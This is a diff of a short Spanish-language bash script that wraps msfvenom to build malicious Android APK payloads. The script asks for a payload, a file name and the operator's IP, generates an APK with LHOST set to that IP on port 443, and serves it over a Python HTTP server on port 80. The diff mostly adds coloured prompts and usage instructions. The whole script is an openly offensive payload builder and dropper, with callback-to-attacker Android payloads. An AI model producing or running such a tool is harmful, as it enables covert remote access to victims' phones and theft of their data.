@@ -1,16 +1,25 @@
-#!/bin/bash 
-echo "que payload quieres buscar, android"
+#!/bin/bash
+echo -e "\e[0;34mPARA UTILIZAR MI SCRIPT
+Hay que saber que solo se puede utilizar con payloads de Android.
+También que cuando le pongas el nombre a un archivo no hay que poner el
+ .apk sino simplemente el nombre.
+Por favor las ips tienen que ser válidas de lo contrario saldrá un mensaje de error.
+A la hora de buscar los payloads en la parte derecha podrás ver para que sirve casa uno.
+Una vez se ejecute el comando para crear tu archivo .apk se lanzará un
+ servidor http y simplemente tendrás que poner tu ip en un navegador como
+ duckduckgo y podrás acceder a tus archivos\e[0"
+echo -e "\e[1;31mque payload quieres buscar, android\e[0m"
 read payl
 payl=$payl
 msfvenom -l payload | grep $payl
-echo "que payload quieres utilizar, android"
+echo -e "\e[1;31mque payload quieres utilizar, android\e[0m"
 read pay
-echo "que nombre le quieres poner a tu archivo "
+echo -e "\e[1;31mque nombre le quieres poner a tu archivo\e[0m"
 read nombre
-echo "cual es tu ip"
+echo -e "\e[1;31mcual es tu ip\e[0m"
 read ip
 ip=$ip
 nombre=$nombre
 pay=$pay
 
-msfvenom -p $pay LHOST=$ip LPORT=443 -o $nombre.apk && python3 -m http.server 80 || echo "parece que alguna de tu respuesta no es correcta"
+msfvenom -p $pay LHOST=$ip LPORT=443 -o $nombre.apk && python3 -m http.server 80 || echo -e "\e[0;32mparece que alguna de tu respuesta no es correcta\e[0m"
